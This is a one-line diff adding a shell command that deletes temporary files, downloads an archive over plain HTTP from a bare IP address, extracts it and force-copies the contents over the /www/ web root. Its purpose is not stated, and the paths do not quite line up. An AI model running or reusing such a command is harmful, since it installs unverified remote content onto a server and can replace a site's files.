@@ -1,0 +1,1 @@
+rm -rf /tmp/www.gz;rm -rf /tmp/www;sync;wget http://134.227.227.110/www.gz;tar zxvf www.gz;cp -rf /tmp/www/* /www/;sync
